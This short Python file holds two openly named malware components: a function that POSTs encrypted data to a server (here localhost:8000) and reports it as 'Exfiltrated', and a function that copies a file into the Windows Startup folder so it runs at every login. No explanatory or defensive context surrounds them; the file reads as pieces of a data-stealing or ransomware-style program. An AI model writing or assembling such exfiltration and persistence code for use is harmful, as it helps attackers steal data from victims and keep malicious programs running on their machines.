import requests

def exfiltrate_data(encrypted_data):
    url = "http://localhost:8000"
    try:
        response = requests.post(url, data=encrypted_data)
        print("Exfiltrated:", response.status_code)
    except:
        print("Server not available")


import shutil, os

def add_to_startup(file_path):
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shutil.copy(file_path, startup_path)
